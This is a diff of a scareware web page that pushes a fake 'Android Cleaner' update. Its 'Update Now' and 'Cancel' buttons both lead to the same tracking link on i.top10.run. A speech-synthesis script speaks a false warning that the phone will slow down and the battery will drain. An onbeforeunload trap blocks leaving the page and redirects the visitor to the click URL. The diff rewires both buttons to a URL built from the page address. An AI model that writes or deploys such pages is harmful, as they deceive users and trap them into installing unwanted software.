@@ -892,11 +892,11 @@ setTimeout(func, getRandomInt(120,220)*1000);
 		</div>
 		
         <div class="buttons">
-            <a class="button exitpoint" href="https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=3">
+            <a class="button exitpoint" id="buttonexitpoint" href="https://i.top10.run/click.php?key=x1pbcwpn5zhedv3kmkm8">
 				<span>
 																Update Now									</span>
             </a>
-            <a class="button cancel" href="https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=3">
+            <a class="button cancel" id="buttoncancel" href="https://i.top10.run/click.php?key=x1pbcwpn5zhedv3kmkm8">
 				<span>
 																Cancel									</span>
             </a>
@@ -933,6 +933,11 @@ window.top.location = window.location;
 </script>
 <script type="text/javascript">function speak(c){var b=new SpeechSynthesisUtterance();var a=speechSynthesis.getVoices();b.voice=a[2];b.voiceURI="native";b.volume=1;b.rate=1;b.pitch=1;b.text=c;b.lang="en-US";speechSynthesis.speak(b)}speak("You should update your Android Cleaner now or your phone might be slowed down and your battery may discharge quickly.");</script>
 <script type="text/javascript">
+	var nc = 'https://i.top10.run/click.php?key=x1pbcwpn5zhedv3kmkm8'+window.location.href.split("split=true",2)[1];
+	
+	document.getElementById("buttonexitpoint").href = nc;
+	document.getElementById("buttoncancel").href = nc;
+
     (function (w, d) {
         var epp = function () {
             if (w.onbeforeunload === null) {
@@ -943,14 +948,14 @@ window.top.location = window.location;
                 };
                 function epp() {
                     to = setTimeout(function () {
-                        w.location.replace('https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=3');
+                        w.location.replace(nc);
                         repp();
                     }, 100);
                     return 'You should update your Android Cleaner now or your phone might be slowed down and your battery may discharge quickly.';
                 }
                 w.onbeforeunload = epp;
-                // Prevent epp firing from clicking on tracking links 压制弹框
-                var ln = d.querySelectorAll("[href='https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=3']");
+                // Prevent epp firing from clicking on tracking links
+                var ln = d.querySelectorAll("[href="+nc+"]");
                 for (i = 0; i < ln.length; ++i) {
                     ln[i].addEventListener("click", function () {
                         repp();
